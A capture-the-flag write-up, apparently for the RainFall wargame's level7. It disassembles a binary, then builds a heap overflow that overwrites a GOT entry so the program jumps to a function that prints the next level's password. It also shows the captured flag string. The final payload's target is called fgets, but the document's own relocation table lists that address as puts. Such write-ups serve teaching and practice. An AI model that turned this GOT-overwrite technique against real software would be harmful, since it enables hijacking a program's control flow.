We have 1 more function besides main.
```
Dump of assembler code for function m:
   0x080484f4 <+0>:	push   %ebp
   0x080484f5 <+1>:	mov    %esp,%ebp
   0x080484f7 <+3>:	sub    $0x18,%esp
   0x080484fa <+6>:	movl   $0x0,(%esp)
   0x08048501 <+13>:	call   0x80483d0 <time@plt>
   0x08048506 <+18>:	mov    $0x80486e0,%edx
   0x0804850b <+23>:	mov    %eax,0x8(%esp)
   0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
   0x08048517 <+35>:	mov    %edx,(%esp)
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
   0x0804851f <+43>:	leave  
   0x08048520 <+44>:	ret    
```
This loks like it will print a global variable
Now the main
```
Dump of assembler code for function main:
   0x08048521 <+0>:	push   %ebp
   0x08048522 <+1>:	mov    %esp,%ebp
   0x08048524 <+3>:	and    $0xfffffff0,%esp
   0x08048527 <+6>:	sub    $0x20,%esp
   0x0804852a <+9>:	movl   $0x8,(%esp)
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:	mov    %eax,0x1c(%esp) --- int *a = malloc(8)
   0x0804853a <+25>:	mov    0x1c(%esp),%eax
   0x0804853e <+29>:	movl   $0x1,(%eax) --- *a = 1
   0x08048544 <+35>:	movl   $0x8,(%esp)
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:	mov    %eax,%edx ---int *b = malloc(8)
   0x08048552 <+49>:	mov    0x1c(%esp),%eax
   0x08048556 <+53>:	mov    %edx,0x4(%eax) --- *(a + 1) = b
   0x08048559 <+56>:	movl   $0x8,(%esp)
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:	mov    %eax,0x18(%esp) ---int *c = malloc(8)
   0x08048569 <+72>:	mov    0x18(%esp),%eax
   0x0804856d <+76>:	movl   $0x2,(%eax) --- *c = 2
   0x08048573 <+82>:	movl   $0x8,(%esp)
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:	mov    %eax,%edx --- int *d= malloc(8)
   0x08048581 <+96>:	mov    0x18(%esp),%eax
   0x08048585 <+100>:	mov    %edx,0x4(%eax) --- *(c + 1) = d
   0x08048588 <+103>:	mov    0xc(%ebp),%eax
   0x0804858b <+106>:	add    $0x4,%eax
   0x0804858e <+109>:	mov    (%eax),%eax
   0x08048590 <+111>:	mov    %eax,%edx
   0x08048592 <+113>:	mov    0x1c(%esp),%eax
   0x08048596 <+117>:	mov    0x4(%eax),%eax --- load argv[1]
   0x08048599 <+120>:	mov    %edx,0x4(%esp)
   0x0804859d <+124>:	mov    %eax,(%esp)
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt> --- strcpy(*(a + 1), argv[1])
   0x080485a5 <+132>:	mov    0xc(%ebp),%eax
   0x080485a8 <+135>:	add    $0x8,%eax --- load argv[2]
   0x080485ab <+138>:	mov    (%eax),%eax
   0x080485ad <+140>:	mov    %eax,%edx
   0x080485af <+142>:	mov    0x18(%esp),%eax
   0x080485b3 <+146>:	mov    0x4(%eax),%eax
   0x080485b6 <+149>:	mov    %edx,0x4(%esp)
   0x080485ba <+153>:	mov    %eax,(%esp)
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt> --- strcpy(*(c + 1), argv[2])
   0x080485c2 <+161>:	mov    $0x80486e9,%edx --- "r"
   0x080485c7 <+166>:	mov    $0x80486eb,%eax --- "/home/user/level8/.pass"
   0x080485cc <+171>:	mov    %edx,0x4(%esp)
   0x080485d0 <+175>:	mov    %eax,(%esp)
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:	mov    %eax,0x8(%esp)
   0x080485dc <+187>:	movl   $0x44,0x4(%esp) --- read 68 bytes
   0x080485e4 <+195>:	movl   $0x8049960,(%esp) --- stored read buffer in global variable
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:	movl   $0x8048703,(%esp) --- "~~"
   0x080485f7 <+214>:	call   0x8048400 <puts@plt> --- prints ~~
   0x080485fc <+219>:	mov    $0x0,%eax
   0x08048601 <+224>:	leave  
   0x08048602 <+225>:	ret  
```
Efectively this could be a linked list where we dynamically allocate more variables. Copy the argv\[1] and argv\[2] into the second element of the linked list a, c. Than the program will read the .pass file, place it in a global variable that is printed in the \<m> function and than put on screen "\~~". 
So now we have to find a way to redirect program flow to function m.
We can see the function fgets which really doesn't do anything so we could try hijacking the GOT address so we can redirect flow to our function m.
```
(gdb) disas 0x80483c0
Dump of assembler code for function fgets@plt:
   0x080483c0 <+0>:	jmp    *0x8049918
   0x080483c6 <+6>:	push   $0x8
   0x080483cb <+11>:	jmp    0x80483a0
```
We also know that we are able to perform a buffer overflow into our mallocs, so what we could try doing is overflowing up to the address of the pointer that is used in the second strcpy and puting the address of the function m into the second argument. Efectively coping the address of fgets in the GOT with the address of function m.
First we get our offset wich is the difference between the pointer address where we start writing with argv\[1]  and  where our 4th chunk is (3 malloc memory position + 4 <+53>:	mov    %edx,0x4(%eax))
```
level7@RainFall:~$ ltrace ./level7 $(python -c 'print "A"*20 + "\x18\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
__libc_start_main(0x8048521, 3, 0xbffff6e4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                               = 0x0804a008
malloc(8)                                                               = 0x0804a018
malloc(8)                                                               = 0x0804a028
malloc(8)                                                               = 0x0804a038
strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAA\030\231\004\b")                = 0x0804a018
strcpy(0x08049918, "\364\204\004\b")                                    = 0x08049918
fopen("/home/user/level8/.pass", "r")                                   = 0
fgets( <unfinished ...>
time(NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```
Now we can see that we actually get in the m function (call to time), but it segfaults because we might be writing into the variables of the function next one on the stack.
```
level7@RainFall:~$ objdump -R level7 
level7:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049904 R_386_GLOB_DAT    __gmon_start__
08049914 R_386_JUMP_SLOT   printf
08049918 R_386_JUMP_SLOT   fgets
0804991c R_386_JUMP_SLOT   time
08049920 R_386_JUMP_SLOT   strcpy
08049924 R_386_JUMP_SLOT   malloc
08049928 R_386_JUMP_SLOT   puts
0804992c R_386_JUMP_SLOT   __gmon_start__
08049930 R_386_JUMP_SLOT   __libc_start_main
08049934 R_386_JUMP_SLOT   fopen
```
We should try our expoit with fgets() GOT address.
```
level7@RainFall:~$ ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```